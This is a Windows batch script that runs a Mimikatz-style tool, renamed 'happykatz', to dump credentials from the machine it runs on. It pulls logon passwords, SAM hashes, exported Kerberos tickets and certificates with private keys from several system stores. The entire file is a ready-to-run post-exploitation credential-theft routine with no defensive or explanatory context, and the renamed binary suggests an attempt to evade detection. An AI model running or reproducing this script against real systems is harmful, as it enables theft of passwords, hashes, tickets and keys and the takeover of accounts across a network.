@echo off
REM Special case for hashdump only
IF DEFINED ProgramFiles(x86) (set OSbit=64) else (set OSbit=32)
echo :------------------
echo :::... Try to dump hashes and logon password ...:::
echo :------------------
echo :
echo :------------------
echo :::... sekurlsa::logonPasswords full ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"

echo :
echo :------------------
echo :::... lsadump::sam ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

echo :
echo :------------------
echo :::... sekurlsa::tickets /export ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"

echo :
echo :------------------
echo :::... crypto::certificates /export (CERT_SYSTEM_STORE_CURRENT_USER) ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_CURRENT_USER /store:my /export" "exit"

echo :
echo :------------------
echo :::... crypto::certificates /export (CERT_SYSTEM_STORE_LOCAL_MACHINE) ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:my /export" "exit"

echo :
echo :------------------
echo :::... crypto::certificates /export (CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE) ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE /store:my /export" "exit"

echo :
echo :------------------
echo :::... crypto::certificates /export (CERT_SYSTEM_STORE_USERS) ...:::
echo :------------------
happykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_USERS /store:my /export" "exit"
echo :
echo :------------------
echo :::... End of the hashdump ...:::
echo :------------------
